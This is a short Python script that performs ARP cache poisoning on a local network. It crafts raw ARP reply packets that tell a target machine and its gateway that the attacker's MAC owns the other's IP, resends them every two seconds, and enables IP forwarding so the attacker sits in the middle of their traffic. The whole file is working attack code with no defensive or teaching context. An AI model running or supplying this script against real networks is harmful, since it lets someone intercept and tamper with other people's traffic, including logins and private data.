# coding : utf8


import socket
import sys
import os 
import time
from threading import Thread
import struct
import binascii

class ArpPoison(Thread) :

	def __init__(self):
		Thread.__init__(self)
		self.interface ="wlan1"
		self.srcMac = "xx:xx:xx:xx:xx:xx"
		self.srcIP = "192.168.1.25"
		self.targetMac ="xx:xx:xx:xx:xx:xx"
		self.gatewayMac = "xx:xx:xx:xx:xx:xx"
		self.gatewayIp = "192.168.1.1"
		self.targetIp ="192.168.1.10"
		self.kill_received = False

	def run(self):
		sock1 = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x800))
		sock1.bind((self.interface, socket.htons(0x800)))
		sock2 = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x800))
		sock2.bind((self.interface, socket.htons(0x800)))
		packet1 = self.buildEthernetHeader(self.targetMac) 
		packet1 += self.buildArpHeader(self.targetIp, self.targetMac, self.gatewayIp)
		packet2 = self.buildEthernetHeader(self.gatewayMac)
		packet2 += self.buildArpHeader(self.gatewayIp, self.gatewayMac, self.targetIp)
		print ("Start poisoning ....")
		os.system("sysctl -w net.inet.ip.forwarding=1")
		while not self.kill_received: 
			sock1.send(packet1)
			sock2.send(packet2)
			time.sleep(2)
		

	def buildEthernetHeader(self, hwdst):
		protocol = 0x0806 # ARP 
		eth_hdr = struct.pack("!6s6sH", self.mactobinar(hwdst), self.mactobinar(self.srcMac), protocol)
		return eth_hdr

	def buildArpHeader(self,ipdst,hwdst,ipsrc):
		htype =1 # HardwareType
		ptype = 0x0800 # Protocol type IPV4 
		hsize = 6 # Hardware adresse len
		psize = 4 # Protocol adress len
		opcode = 2 # 1 = request , 2 = response 
		senderMacAdr = self.mactobinar(self.srcMac)
		senderIpAdr = socket.inet_aton(ipsrc)
		targetMacAdr = self.mactobinar(hwdst)
		targetIpAdr = socket.inet_aton(ipdst)
		arp_hdr = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hsize,psize,opcode,senderMacAdr,senderIpAdr,targetMacAdr,targetIpAdr)
		return arp_hdr

	def mactobinar(self,mac): 
		return binascii.unhexlify(mac.replace(':',''))

try :
	test = ArpPoison()
	test.start()
	while True: 
		time.sleep(0.5)
except KeyboardInterrupt : 
	test.kill_received = True
	test.join()
	print ("Bye bye ....")
	sys.exit(0)
